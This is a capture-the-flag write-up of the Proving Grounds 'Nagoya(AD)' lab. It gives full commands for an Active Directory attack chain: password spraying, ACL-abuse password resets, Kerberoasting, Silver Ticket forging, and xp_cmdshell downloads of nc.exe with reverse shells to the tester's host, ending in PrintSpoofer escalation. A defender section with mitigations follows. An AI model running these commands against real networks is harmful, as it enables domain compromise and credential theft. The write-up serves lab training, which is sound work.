# Nagoya(AD) — Proving Grounds Writeup

**Platform:** Proving Grounds Practice
**OS:** Windows Server (Active Directory)
**Domain:** `nagoya-industries.com`
**Difficulty:** Hard
**Job Role:** Junior Penetration Tester / Bug Bounty Hunter
**Tags:** OSINT · Username Enumeration · Password Spraying · BloodHound · GenericAll Abuse · Kerberoasting · Silver Ticket · Chisel Port Forwarding · MSSQL RCE · SeImpersonatePrivilege · PrintSpoofer

---

## Table of Contents

1. [Lab Overview](#lab-overview)
2. [Reconnaissance](#reconnaissance)
3. [OSINT — Employee Enumeration from Web](#osint--employee-enumeration-from-web)
4. [Username Generation & Validation](#username-generation--validation)
5. [Password Spraying](#password-spraying)
6. [BloodHound AD Enumeration](#bloodhound-ad-enumeration)
7. [GenericAll Privilege Chain — Password Reset](#genericall-privilege-chain--password-reset)
8. [WinRM Access — christopher.lewis](#winrm-access--christopherlewis)
9. [Kerberoasting — svc_mssql](#kerberoasting--svc_mssql)
10. [Port Forwarding — Chisel MSSQL Tunnel](#port-forwarding--chisel-mssql-tunnel)
11. [Silver Ticket Attack — MSSQL Impersonation](#silver-ticket-attack--mssql-impersonation)
12. [MSSQL RCE — Reverse Shell via xp_cmdshell](#mssql-rce--reverse-shell-via-xp_cmdshell)
13. [Privilege Escalation — SeImpersonatePrivilege + PrintSpoofer](#privilege-escalation--seimpersonateprivilege--printspoofer)
14. [Flags](#flags)
15. [Attack Chain](#-attack-chain)
16. [Skills Demonstrated](#-skills-demonstrated)
17. [Lessons Learned](#-lessons-learned)
18. [References](#references)

---

## Lab Overview

> *"Nagoya(AD) is a hard-rated Active Directory lab requiring a full multi-stage attack chain: web OSINT → credential spraying → BloodHound analysis → ACL abuse → Kerberoasting → port tunneling → Silver Ticket → MSSQL RCE → privilege escalation via SeImpersonatePrivilege."*

**Key Objectives:**
- Harvest employee names from the company website and generate domain username candidates
- Validate users via Kerbrute and perform seasonal password spraying
- Use BloodHound to map AD ACL misconfigurations and exploit a GenericAll privilege chain
- Kerberoast service accounts to recover `svc_mssql` credentials
- Forward the internal MSSQL port via Chisel and forge a Silver Ticket to impersonate Administrator
- Gain SYSTEM via MSSQL `xp_cmdshell` → SeImpersonatePrivilege → PrintSpoofer

---

## Reconnaissance

### Nmap Scan

```bash
nmap -sC -sV -sS -A -T5 -p- -Pn 192.168.144.21
```

**Screenshot — Nmap Scan Output:**

![Nmap Scan](screenshots/nmap_scan.png)

**Ports Discovered:**

| Port | State | Service | Notes |
|------|-------|---------|-------|
| 53 | open | DNS | Simple DNS Plus |
| 80 | open | HTTP | Microsoft IIS 10.0 — **Nagoya Industries** |
| 88 | open | Kerberos | Microsoft Windows Kerberos |
| 135 | open | msrpc | Microsoft Windows RPC |
| 139 | open | netbios-ssn | Microsoft Windows netbios-ssn |
| 464 | open | kpasswd5 | Kerberos password change |
| 593 | open | ncacn_http | RPC over HTTP 1.0 |
| 3268 | open | LDAP | AD LDAP — `Domain: nagoya-industries.com` |
| 3269 | open | LDAPS | Global Catalog SSL |
| 5985 | open | WinRM | Microsoft HTTPAPI 2.0 |
| 49668+ | open | msrpc | Dynamic RPC |

**Key Nmap Findings:**
- Domain: **nagoya-industries.com**
- NetBIOS Name: **NAGOYA-IND** / Computer: **NAGOYA**
- Product Version: **10.0.17763** (Windows Server 2019)
- WinRM available on port 5985 — potential lateral movement target
- This is a **Domain Controller**

### /etc/hosts Update

```bash
echo "192.168.144.21 nagoya-industries.com nagoya" | sudo tee -a /etc/hosts
```

**Screenshot — /etc/hosts Updated:**

![Hosts File](screenshots/hosts_file.png)

---

## OSINT — Employee Enumeration from Web

### Port 80 — Nagoya Industries Website

Visiting `http://192.168.144.21` reveals the **Nagoya Industries** company website — a fishing company operating for over 50 years.

**Screenshot — Nagoya Industries Homepage:**

![Website Homepage](screenshots/website_homepage.png)

### Employee Name Harvesting

The website exposes a **Team** page listing employee full names — a critical OSINT finding for username generation:

**Screenshot — Employee Team Page:**

![Employee Team Page](screenshots/employee_team.png)

**Employees harvested:**

```
Matthew Harrison    Emma Miah         Rebecca Bell
Scott Gardner       Terry Edwards     Holly Matthews
Anne Jenkins        Brett Naylor      Melissa Mitchell
Craig Carr          Fiona Clark       Patrick Martin
Kate Watson         Kirsty Norris     Andrea Hayes
Abigail Hughes      Melanie Watson    Frances Ward
Sylvia King         Wayne Hartley     Iain White
Joanna Wood         Bethan Webster    Elaine Brady
Christopher Lewis   Megan Johnson     Damien Chapman
Joanne Lewis
```

Save to file:

```bash
nano nagoya_user.txt
# Paste all employee names, one per line
```

**Screenshot — nagoya_user.txt Created:**

![User List Created](screenshots/nagoya_usertxt.png)

---

## Username Generation & Validation

### Username-Anarchy — Generate All Format Variants

Domain username formats are unknown. Generate every possible variant using `username-anarchy`:

```bash
git clone https://github.com/urbanadventurer/username-anarchy.git
cd username-anarchy
./username-anarchy -i nagoya_user.txt > domain-users.txt
```

**Screenshot — Username-Anarchy Generating Variants:**

![Username Anarchy](screenshots/username_anarchy.png)

Sample output formats generated:
```
matthew, matthewharrison, matthew.harrison, matthewh, mattharr,
m.harrison, mharrison, emma, emma.miah, emmam, e.miah ...
```

### Kerbrute — Validate Valid Domain Users

```bash
kerbrute userenum --dc 192.168.144.21 -d nagoya-industries.com domain-users.txt
```

**Screenshot — Kerbrute Validation (28 Valid Users Found):**

![Kerbrute User Validation](screenshots/kerbrute_enum.png)

```
2025/08/30 17:32:31 > Using KDC(s): 192.168.144.21:88
2025/08/30 17:32:32 > Done! Tested 405 usernames (28 valid) in 1.202 seconds
```

**28 valid users confirmed.** Format identified: `firstname.lastname`

Create refined user list:

```bash
nano user2.txt
```

```
matthew.harrison    emma.miah         rebecca.bell
scott.gardner       terry.edwards     holly.matthews
anne.jenkins        brett.naylor      melissa.mitchell
craig.carr          fiona.clark       patrick.martin
kate.watson         kirsty.norris     andrea.hayes
abigail.hughes      melanie.watson    frances.ward
sylvia.king         wayne.hartley     iain.white
joanna.wood         bethan.webster    elaine.brady
christopher.lewis   megan.johnson     damien.chapman
joanne.lewis
```

**Screenshot — Refined user2.txt:**

![User2 List](screenshots/user2_txt.png)

---

## Password Spraying

### Craft Season-Based Passwords

The website footer shows **© 2023 - Nagoya**. Common enterprise password patterns use company name + year or season + year:

```
Summer2023
Nagoya2023
```

### CrackMapExec Password Spray

```bash
crackmapexec smb 192.168.144.21 -u user2.txt -p Summer2023
crackmapexec smb 192.168.144.21 -u user2.txt -p Nagoya2023
```

**Screenshot — Password Spray Results — Two Hits:**

![Password Spray](screenshots/password_spray.png)

**Valid credentials found:**

```
andrea.hayes  : Nagoya2023   ✅
fiona.clark   : Summer2023   ✅
```

---

## BloodHound AD Enumeration

### Collect AD Data with bloodhound-python

```bash
bloodhound-python \
  -u andrea.hayes \
  -p Nagoya2023 \
  -ns 192.168.144.21 \
  -d nagoya-industries.com \
  -c all
```

**Screenshot — BloodHound Collection Complete:**

![BloodHound Collection](screenshots/bloodhound_collection.png)

Zip and import into BloodHound:

```bash
zip -r nagoya_bh.zip *.json
# Import into BloodHound GUI
```

### BloodHound Graph Analysis

**Screenshot — BloodHound — Fiona Clark Group Membership:**

![BloodHound Fiona Clark](screenshots/bloodhound_fiona.png)

**Screenshot — BloodHound — GenericAll Privilege Chain:**

![BloodHound ACL Chain](screenshots/bloodhound_acl_chain.png)

**Screenshot — BloodHound — Christopher Lewis Remote Management:**

![BloodHound Christopher](screenshots/bloodhound_christopher.png)

**Critical ACL Privilege Chain Discovered:**

```
fiona.clark
    └─ MemberOf → EMPLOYEES group
            └─ GenericAll → svc_helpdesk
                    └─ GenericAll → christopher.lewis
                            └─ MemberOf → REMOTE MANAGEMENT USERS
                                    └─ Can WinRM to DC ✅
```

> **Attack path:** Use `fiona.clark`'s group membership to reset `svc_helpdesk` password → then use `svc_helpdesk`'s GenericAll to reset `christopher.lewis` password → WinRM into DC.

---

## GenericAll Privilege Chain — Password Reset

### Step 1 — Reset svc_helpdesk Password via fiona.clark

```bash
rpcclient -U "fiona.clark%Summer2023" 192.168.144.21
rpcclient $> setuserinfo2 svc_helpdesk 23 Password1
```

**Screenshot — svc_helpdesk Password Changed:**

![svc_helpdesk Password Reset](screenshots/rpcclient_helpdesk.png)

### Step 2 — Reset christopher.lewis Password via svc_helpdesk

```bash
rpcclient -U "svc_helpdesk%Password1" 192.168.144.21
rpcclient $> setuserinfo2 christopher.lewis 23 Password1
```

**Screenshot — christopher.lewis Password Changed:**

![christopher.lewis Password Reset](screenshots/rpcclient_christopher.png)

**Credential chain established:**

```
fiona.clark:Summer2023 → svc_helpdesk:Password1 → christopher.lewis:Password1
```

---

## WinRM Access — christopher.lewis

### Evil-WinRM Login

```bash
evil-winrm -i 192.168.144.21 -u christopher.lewis -p Password1
```

**Screenshot — WinRM Shell as christopher.lewis:**

![Evil-WinRM Shell](screenshots/evil_winrm_shell.png)

```
C:\Users\christopher.Lewis\Documents>
```

Shell obtained as `christopher.lewis`. Access to Administrator and svc_mssql home directories is denied — need further escalation.

---

## Kerberoasting — svc_mssql

### Identify Kerberoastable Service Accounts

```bash
python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py \
  -dc-ip 192.168.144.21 \
  nagoya-industries.com/fiona.clark:Summer2023
```

**Screenshot — SPNs Discovered:**

![GetUserSPNs](screenshots/getuserspns.png)

**SPNs found:**

| SPN | User Account | Notes |
|-----|-------------|-------|
| `http/nagoya.nagoya-industries.com` | svc_helpdesk | Password already known |
| `mssql/nagoya.nagoya-industries.com` | **svc_mssql** | Target — MSSQL service account |

### Request and Save TGS Hashes

```bash
python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py \
  -dc-ip 192.168.144.21 \
  nagoya-industries.com/fiona.clark:Summer2023 \
  -request \
  -outputfile svc_hash
```

**Screenshot — TGS Hashes Captured:**

![Kerberoast Hashes](screenshots/kerberoast_hashes.png)

### Crack Hashes with Hashcat

```bash
hashcat -m 13100 svc_hash /usr/share/wordlists/rockyou.txt
```

**Cracked credentials:**

```
svc_helpdesk : Password1   (confirms our earlier reset)
svc_mssql    : Service1    ✅ (new credential)
```

---

## Port Forwarding — Chisel MSSQL Tunnel

### MSSQL Port 1433 Not Exposed Externally

Check MSSQL from the christopher.lewis WinRM shell:

```powershell
netstat -ano | Select-String "1433"
```

**Screenshot — Port 1433 Listening Internally:**

![Port 1433 Internal](screenshots/netstat_1433.png)

```
TCP  0.0.0.0:1433   0.0.0.0:0   LISTENING   3612
```

Port 1433 is listening but firewalled externally. Use Chisel to tunnel it.

### Setup Chisel Reverse Tunnel

**Attacker machine:**

```bash
chisel server --socks5 --reverse -p 139
```

**Screenshot — Chisel Server Listening:**

![Chisel Server](screenshots/chisel_server.png)

**Transfer Chisel to target (via christopher.lewis WinRM):**

```bash
# Attacker: host the binary
cd /home/kali/Desktop/chisel_1.10.1_windows_amd64
python3 -m http.server 8000
```

```cmd
# Target (WinRM shell):
certutil -urlcache -f http://192.168.45.158:8000/chisel.exe chisel.exe
```

**Screenshot — Chisel.exe Downloaded to Target:**

![Chisel Downloaded](screenshots/chisel_downloaded.png)

**Connect back and forward port 1433:**

```cmd
cmd /c "chisel client 192.168.45.158:139 R:1433:127.0.0.1:1433"
```

**Screenshot — Chisel Client Connected:**

![Chisel Connected](screenshots/chisel_connected.png)

### Verify Tunnel

```bash
nmap 127.0.0.1 -p 1433
```

**Screenshot — Port 1433 Now Open on Localhost:**

![MSSQL Port Forwarded](screenshots/mssql_port_forwarded.png)

```
PORT     STATE  SERVICE
1433/tcp open   ms-sql-s
```

---

## Silver Ticket Attack — MSSQL Impersonation

### Initial MSSQL Connection (Insufficient Privileges)

```bash
python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py \
  svc_mssql:Service1@127.0.0.1 -windows-auth
```

**Screenshot — MSSQL Connected as svc_mssql (guest):**

![MSSQL svc_mssql](screenshots/mssql_svcmssql.png)

```sql
SQL (NAGOYA-IND\svc_mssql guest@master)> enable_xp_cmdshell
ERROR: User does not have permission to perform this action.
```

`svc_mssql` lacks SA privileges — cannot enable `xp_cmdshell`. Need to forge a **Silver Ticket** to impersonate Administrator.

### Gather Required Silver Ticket Ingredients

**1 — Get Domain SID (from christopher.lewis WinRM):**

```powershell
Import-Module ActiveDirectory
Get-ADDomain
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

**Screenshot — Domain SID and SPN:**

![Domain SID](screenshots/domain_sid.png)

```
Domain SID   : S-1-5-21-1969309164-1513403977-1686805993
SPN Target   : MSSQL/nagoya.nagoya-industries.com
User-ID 500  : Administrator
```

**2 — Convert svc_mssql Password to NTLM Hash:**

```bash
echo -n 'Service1' | iconv -t UTF-16LE | openssl md4
```

**Screenshot — NTLM Hash Generated:**

![NTLM Hash](screenshots/ntlm_hash.png)

```
MD4(stdin) = e3a0168bc21cfb88b95c954a5b18f57c
```

### Forge the Silver Ticket

```bash
python3 /usr/share/doc/python3-impacket/examples/ticketer.py \
  -nthash e3a0168bc21cfb88b95c954a5b18f57c \
  -domain-sid S-1-5-21-1969309164-1513403977-1686805993 \
  -domain nagoya-industries.com \
  -spn MSSQL/nagoya.nagoya-industries.com \
  -user-id 500 \
  Administrator
```

**Screenshot — Silver Ticket Forged:**

![Silver Ticket Forged](screenshots/silver_ticket_forged.png)

```
[*] Creating basic skeleton ticket and PAC Infos
[+] Customizing ticket for nagoya-industries.com/Administrator
[+] PAC_LOGON_INFO
[+] Signing/encrypting final ticket
```

### Export ccache and Configure Kerberos

```bash
export KRB5CCNAME=/root/Desktop/nagoya/Administrator.ccache
```

**Configure /etc/krb5.conf:**

```bash
apt install krb5-user
nano /etc/krb5.conf
```

```ini
[libdefaults]
    default_realm = NAGOYA-INDUSTRIES.COM
    kdc_timesync = 1
    ccache_type = 4
    forwardable = true
    proxiable = true
    rdns = false
    fcc-mit-ticketflags = true

[realms]
    NAGOYA-INDUSTRIES.COM = {
        kdc = nagoya.nagoya-industries.com
    }

[domain_realm]
    .nagoya-industries.com = NAGOYA-INDUSTRIES.COM
```

### Connect as Administrator via Kerberos

Update `/etc/hosts` to point `nagoya.nagoya-industries.com` to `127.0.0.1` (tunneled port):

```bash
python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py \
  -k nagoya.nagoya-industries.com
```

**Screenshot — MSSQL Connected as Administrator via Silver Ticket:**

![MSSQL Administrator](screenshots/mssql_administrator.png)

```
SQL (NAGOYA-IND\Administrator dbo@master)>
```

---

## MSSQL RCE — Reverse Shell via xp_cmdshell

### Enable xp_cmdshell

```sql
SQL> enable_xp_cmdshell
SQL> xp_cmdshell "whoami /priv"
```

**Screenshot — xp_cmdshell Enabled, Privileges Shown:**

![xp_cmdshell Enabled](screenshots/xp_cmdshell.png)

Key privilege noted: **SeImpersonatePrivilege** — `Enabled`

### Upload nc.exe and Get Reverse Shell

**Host nc.exe on attacker:**

```bash
cp /usr/share/windows-resources/binaries/nc.exe .
python3 -m http.server 80
```

**Download nc.exe via xp_cmdshell:**

```sql
SQL> xp_cmdshell "curl http://192.168.45.158/nc.exe -o c:\temp\nc.exe"
```

**Screenshot — nc.exe Uploaded to Target:**

![nc.exe Upload](screenshots/nc_upload.png)

**Trigger reverse shell:**

```sql
SQL> xp_cmdshell "c:\temp\nc.exe 192.168.45.158 445 -e cmd.exe"
```

**Listener on attacker:**

```bash
rlwrap nc -lv 445
```

**Screenshot — Shell Received as svc_mssql$:**

![Shell as svc_mssql](screenshots/shell_svcmssql.png)

```
C:\Windows\system32> whoami
nagoya-ind\svc_mssql
```

---

## Privilege Escalation — SeImpersonatePrivilege + PrintSpoofer

### Confirm SeImpersonatePrivilege

```cmd
whoami /priv
```

**Screenshot — SeImpersonatePrivilege Enabled:**

![SeImpersonate](screenshots/seimpersonate.png)

```
SeImpersonatePrivilege   Impersonate a client after authentication   Enabled
```

### Upload PrintSpoofer.exe

```bash
# Attacker — already serving HTTP:
python3 -m http.server 80
```

```cmd
# Target shell:
curl http://192.168.45.158/PrintSpoofer.exe -o c:\temp\PrintSpoofer.exe
```

**Screenshot — PrintSpoofer and nc.exe Uploaded:**

![PrintSpoofer Upload](screenshots/printspoofer_upload.png)

### Execute PrintSpoofer → SYSTEM Shell

```bash
# Attacker listener:
rlwrap nc -lvnp 8000
```

```cmd
# Target:
PrintSpoofer.exe -c "nc.exe 192.168.45.158 8000 -e cmd"
```

**Screenshot — SYSTEM Shell via PrintSpoofer:**

![SYSTEM Shell](screenshots/system_shell.png)

```
C:\Windows\system32> whoami
nt authority\system
```

**Full SYSTEM access confirmed!**

---

## Flags

### local.txt

After priv escalation, connect via `evil-winrm` as `christopher.lewis` to retrieve local.txt:

```bash
evil-winrm -i 192.168.144.21 -u christopher.lewis -p Password1
```

```
59b8da150907e35a129a6262f183a418
```

### proof.txt

```
C:\Users\Administrator\Desktop> type proof.txt
0ec1436eb37fb7ef3b86e973e9090c6
```

**Screenshot — proof.txt:**

![proof.txt](screenshots/proof_txt.png)

---

## 🗺️ Attack Chain

```
Target: 192.168.144.21 | Domain: nagoya-industries.com
│
├── [Reconnaissance] nmap -sC -sV -sS -A -T5 -p- -Pn
│       ├── Port 80:   IIS — Nagoya Industries website
│       ├── Port 88:   Kerberos — Domain Controller confirmed
│       ├── Port 3268: LDAP — nagoya-industries.com
│       ├── Port 5985: WinRM — potential access vector
│       └── /etc/hosts → 192.168.144.21 nagoya-industries.com nagoya
│
├── [OSINT] Web Employee Harvesting
│       ├── Team page → 28 employee full names extracted
│       └── nagoya_user.txt created
│
├── [Username Enumeration] username-anarchy + kerbrute
│       ├── username-anarchy → 400+ format variants generated
│       ├── kerbrute userenum → 28 valid users confirmed
│       └── Format identified: firstname.lastname
│               └── user2.txt (28 valid domain accounts)
│
├── [Password Spraying] CrackMapExec
│       ├── Passwords: Summer2023, Nagoya2023 (from site copyright)
│       ├── andrea.hayes:Nagoya2023    ✅
│       └── fiona.clark:Summer2023     ✅
│
├── [BloodHound] Domain Enumeration
│       ├── bloodhound-python -u andrea.hayes -p Nagoya2023 -c all
│       └── ACL chain discovered:
│               fiona.clark (EMPLOYEES)
│                   → GenericAll → svc_helpdesk
│                       → GenericAll → christopher.lewis
│                           → REMOTE MANAGEMENT USERS (WinRM to DC)
│
├── [ACL Abuse] GenericAll Password Reset Chain
│       ├── rpcclient fiona.clark → setuserinfo2 svc_helpdesk → Password1
│       ├── rpcclient svc_helpdesk → setuserinfo2 christopher.lewis → Password1
│       └── evil-winrm christopher.lewis:Password1 → DC shell
│
├── [Kerberoasting] TGS Hash Capture + Crack
│       ├── GetUserSPNs.py → svc_mssql (mssql/nagoya) + svc_helpdesk
│       ├── hashcat -m 13100 svc_hash rockyou.txt
│       └── svc_mssql:Service1    ✅
│
├── [Port Forwarding] Chisel Reverse Tunnel
│       ├── Port 1433 internal only (firewalled externally)
│       ├── Attacker: chisel server --socks5 --reverse -p 139
│       ├── Target: certutil → chisel.exe → client connect
│       └── R:1433:127.0.0.1:1433 → MSSQL now on localhost:1433
│
├── [Silver Ticket Attack] MSSQL Administrator Impersonation
│       ├── svc_mssql:Service1 → cannot enable xp_cmdshell (no SA perms)
│       ├── NTLM: echo -n 'Service1' | iconv -t UTF-16LE | openssl md4
│       │           → e3a0168bc21cfb88b95c954a5b18f57c
│       ├── ticketer.py -nthash <hash> -domain-sid S-1-5-21-... -spn MSSQL/... Administrator
│       ├── export KRB5CCNAME=Administrator.ccache
│       └── mssqlclient.py -k nagoya.nagoya-industries.com → Admin SQL session
│
├── [MSSQL RCE] xp_cmdshell → Reverse Shell
│       ├── enable_xp_cmdshell → SUCCESS (as Administrator)
│       ├── xp_cmdshell "curl ... nc.exe -o c:\temp\nc.exe"
│       ├── xp_cmdshell "c:\temp\nc.exe 192.168.45.158 445 -e cmd.exe"
│       └── Shell received as: nagoya-ind\svc_mssql$
│               └── SeImpersonatePrivilege: ENABLED
│
└── [Privilege Escalation] PrintSpoofer → SYSTEM
        ├── Upload PrintSpoofer.exe + nc.exe
        ├── PrintSpoofer.exe -c "nc.exe 192.168.45.158 8000 -e cmd"
        └── NT AUTHORITY\SYSTEM ✅
                ├── local.txt:  59b8da150907e35a129a6262f183a418
                └── proof.txt:  0ec1436eb37fb7ef3b86e973e9090c6
```

---

## 🛡️ Skills Demonstrated

| Skill | Application | MITRE ATT&CK |
|-------|-------------|--------------|
| **Network Reconnaissance** | nmap full port scan identifying full AD service stack | T1046 — Network Service Scanning |
| **OSINT & Web Enumeration** | Harvested 28 employee names from company website Team page | T1591.004 — Employee Identification |
| **Username Generation** | Generated 400+ AD username format variants with username-anarchy | T1078.002 — Domain Accounts |
| **User Enumeration (Kerberos)** | Validated valid domain accounts via Kerbrute AS-REQ | T1110.004 — Credential Stuffing |
| **Password Spraying** | Seasonal/company-themed passwords against 28 domain accounts | T1110.003 — Password Spraying |
| **Active Directory Enumeration** | Full domain enumeration with bloodhound-python | T1087.002 — Domain Account Discovery |
| **BloodHound ACL Analysis** | Identified and mapped 3-hop GenericAll privilege chain | T1069.002 — Domain Groups |
| **ACL Abuse — GenericAll** | Used rpcclient to reset passwords via GenericAll rights | T1484.001 — Group Policy Modification |
| **WinRM Lateral Movement** | evil-winrm access to DC using reset credentials | T1021.006 — Windows Remote Management |
| **Kerberoasting** | Requested and cracked TGS tickets for service accounts | T1558.003 — Kerberoasting |
| **Port Forwarding (Chisel)** | Tunneled internal MSSQL port 1433 to attacker machine | T1572 — Protocol Tunneling |
| **Silver Ticket Attack** | Forged Kerberos ticket to impersonate Administrator for MSSQL | T1558.002 — Silver Ticket |
| **MSSQL Exploitation** | Enabled xp_cmdshell as impersonated Administrator for OS commands | T1505 — Server Software Component |
| **SeImpersonatePrivilege Abuse** | Identified impersonation privilege on service account | T1134.001 — Token Impersonation |
| **PrintSpoofer Privilege Escalation** | Leveraged SeImpersonatePrivilege to escalate to SYSTEM | T1068 — Exploitation for Privilege Escalation |
| **Penetration Testing Methodology** | Full AD attack chain across 10+ distinct techniques | — |

---

## 📚 Lessons Learned

### 🔴 For Attackers (Pentesters)

- **Company websites are AD intelligence goldmines.** A Team/About Us page with full employee names gives you a ready-made username list. Always check every page of a target's web presence before touching the network.
- **Username-anarchy is essential for AD engagements.** Real domains use dozens of naming conventions (`j.smith`, `jsmith`, `john.smith`, `smithj`). Never hand-craft usernames — generate all variants and validate.
- **Seasonal password spraying works.** `Company2023`, `Summer2023`, `Winter2024` are used everywhere. Spray carefully (1 password per day max to avoid lockouts) and check the copyright year on the website for hints.
- **BloodHound is non-negotiable for AD.** The GenericAll chain here was 3 hops deep — impossible to spot manually. Always run bloodhound-python as soon as you have valid credentials.
- **ACL chains are often the shortest path to DA.** GenericAll → password reset is one of the most common privesc paths in real AD environments. Understand and actively look for: GenericAll, GenericWrite, WriteOwner, WriteDACL, AllExtendedRights.
- **Service accounts that can't be reached externally might be reachable internally.** MSSQL on port 1433 was firewalled externally but listening internally — always check `netstat` after getting an initial shell.
- **Silver Ticket = MSSQL access without KDC.** A Silver Ticket abuses the fact that MSSQL validates service tickets locally, not via the KDC. Having the service account's NTLM hash is all you need — the DC doesn't even log the authentication.
- **SeImpersonatePrivilege on a service account is almost always a guaranteed SYSTEM.** Check `whoami /priv` immediately after every new shell — any `Se*Privilege` that is enabled is a potential escalation path.

### 🔵 For Defenders

- **Remove employee names from public-facing websites.** A Team page is a free username wordlist for attackers. If publishing employee names is required, use first names only or implement anti-scraping measures.
- **Enforce a strong password policy with complexity AND history.** Seasonal passwords like `Summer2023` or `Nagoya2023` pass most complexity checks but fall to simple sprays. Require passphrases of 16+ characters.
- **Implement AD account lockout thresholds.** Password spraying works because most environments have no lockout after a few failed attempts. A threshold of 3-5 failures with 30-minute lockout stops spraying cold.
- **Regularly audit ACL permissions in Active Directory.** GenericAll on a user account is a critical misconfiguration. Use BloodHound or PingCastle in defense mode to find and remediate these paths before attackers do.
- **Apply least privilege to service accounts.** `svc_mssql` should not have `SeImpersonatePrivilege`. Windows service accounts running SQL Server should be Managed Service Accounts (MSA) with auto-rotating passwords.
- **Use Group Managed Service Accounts (gMSA) for service accounts.** gMSA passwords are 240 characters, automatically rotated, and not directly Kerberoastable. Replace all SPN-bearing user accounts with gMSAs.
- **Firewall internal services at the host level.** MSSQL should not bind to `0.0.0.0:1433` — restrict to specific IP addresses that legitimately need access, enforced via Windows Firewall.
- **Monitor for Kerberos Silver Ticket indicators.** Silver Tickets produce TGS tickets without a corresponding TGT — anomalous Kerberos events without prior AS-REQ can indicate Silver Ticket attacks. Alert on Event ID 4769 without prior 4768.
- **Disable xp_cmdshell by default.** SQL Server's `xp_cmdshell` should never be enabled in production. If MSSQL is required, disable surface area components and enforce a least-privilege SQL login.
- **Monitor for rpcclient password change activity.** `setuserinfo2` calls via RPC are a known ACL abuse technique. Log and alert on password changes that do not come from standard IT change management processes.

### 🟡 Key Vulnerabilities Summary

| Vulnerability | Root Cause | Severity | Impact | Mitigation |
|---------------|-----------|----------|--------|-----------|
| **Employee OSINT Exposure** | Full names published on website | Medium | Username enumeration for spraying | Remove employee listings; use CAPTCHA |
| **Weak Seasonal Passwords** | No password complexity enforcement | High | Domain credential compromise | Enforce strong policy; MFA on all accounts |
| **GenericAll ACL Misconfiguration** | Over-privileged group permissions | Critical | Full privilege chain to DC WinRM | Audit and remove excessive ACL permissions |
| **Kerberoastable Service Accounts** | SPN on user accounts with weak passwords | High | Offline hash cracking of svc_mssql | Use gMSA; enforce 25+ char service passwords |
| **Internal MSSQL Exposed** | Listening on 0.0.0.0 internally | High | Pivotable via port tunneling | Restrict MSSQL binding; host-based firewall |
| **Silver Ticket Vulnerability** | Service ticket validated locally | Critical | Admin impersonation without KDC logs | Protected Users group; PAC validation |
| **xp_cmdshell Available** | SQL Server feature not hardened | Critical | OS command execution from MSSQL | Disable xp_cmdshell; restrict SA role |
| **SeImpersonatePrivilege on svc_mssql** | Service account over-privileged | Critical | SYSTEM via PrintSpoofer | Use gMSA; remove unnecessary privileges |

---

## References

- [BloodHound — AD Attack Path Analysis](https://github.com/BloodHoundAD/BloodHound)
- [Impacket — GetUserSPNs.py (Kerberoasting)](https://github.com/fortra/impacket)
- [Impacket — ticketer.py (Silver Ticket)](https://github.com/fortra/impacket)
- [Chisel — Fast TCP/UDP Tunneling](https://github.com/jpillora/chisel)
- [PrintSpoofer — SeImpersonatePrivilege Exploit](https://github.com/itm4n/PrintSpoofer)
- [Username-Anarchy — Username Generation](https://github.com/urbanadventurer/username-anarchy)
- [MITRE ATT&CK — T1558.002: Silver Ticket](https://attack.mitre.org/techniques/T1558/002/)
- [MITRE ATT&CK — T1558.003: Kerberoasting](https://attack.mitre.org/techniques/T1558/003/)
- [MITRE ATT&CK — T1110.003: Password Spraying](https://attack.mitre.org/techniques/T1110/003/)
- [Nagoya Writeup Reference — Medium](https://medium.com/@mu.aktepe18/nagoya-proving-ground-walk-through-afb50d51bb0f)

---

## Tools Used

| Tool | Purpose |
|------|---------|
| `nmap` | Network reconnaissance and service fingerprinting |
| `username-anarchy` | Domain username format generation |
| `kerbrute` | Domain user account enumeration via Kerberos |
| `crackmapexec` | SMB password spraying |
| `bloodhound-python` | Active Directory ACL and path enumeration |
| `rpcclient` | Password reset via GenericAll ACL abuse |
| `evil-winrm` | WinRM lateral movement to DC |
| `GetUserSPNs.py` | Kerberoasting — TGS hash capture |
| `hashcat` | Offline hash cracking (Kerberos mode 13100) |
| `chisel` | Reverse TCP port forwarding tunnel |
| `mssqlclient.py` | MSSQL client (Impacket) |
| `ticketer.py` | Silver Ticket forging (Impacket) |
| `openssl md4` | NTLM hash generation from plaintext |
| `PrintSpoofer.exe` | SYSTEM privilege escalation via SeImpersonatePrivilege |
| `nc.exe` | Windows reverse shell delivery |

---

**Platform:** OffSec Proving Grounds Practice
**Author:** Tanvir Ahmed | [tanvirkarim.it](https://tanvirkarim.it)
**GitHub:** [github.com/Tanvir-2](https://github.com/Tanvir-2)
